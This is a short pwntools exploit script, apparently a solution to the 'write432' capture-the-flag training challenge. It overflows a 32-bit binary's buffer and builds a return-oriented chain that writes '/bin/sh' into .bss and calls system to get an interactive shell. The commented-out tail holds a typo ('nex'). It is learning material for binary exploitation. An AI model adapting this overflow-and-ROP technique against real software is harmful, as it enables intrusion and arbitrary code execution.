from pwn import *
import sys

# config
context(os="linux", arch="i386")
context.log_level = "debug"

FILE_NAME = "./write432"
HOST = ""
PORT = 0

if len(sys.argv) > 1 and sys.argv[1] == "r":
    conn = remote(HOST, PORT)
else:
    conn = process(FILE_NAME)

bss=0x0804a040
ebptoedi=0x08048670
pop2ret=0x080486da
system=0x08048430

payload=b"A"*(0x28+0x4)

payload+=p32(pop2ret)
payload+=p32(bss)
payload+=b"/bin"
payload+=p32(ebptoedi)

payload+=p32(pop2ret)
payload+=p32(bss+4)
payload+=b"/sh"+p8(0)
payload+=p32(ebptoedi)

payload+=p32(system)
payload+=b"B"*4
payload+=p32(bss)

conn=process(FILE_NAME)
conn.sendlineafter(">",payload)
conn.interactive()


# elf=ELF(FILE_NAME)
# addr_main=elf.symbols["main"]
# addr_bss=elf.bss()
# addr_dynsym=elf.get_section_by_name(".dynsym").header["sh_addr"]
#
# libc=ELF("./")
# libc_sh=nex(libc.search(b"/bin/sh"))
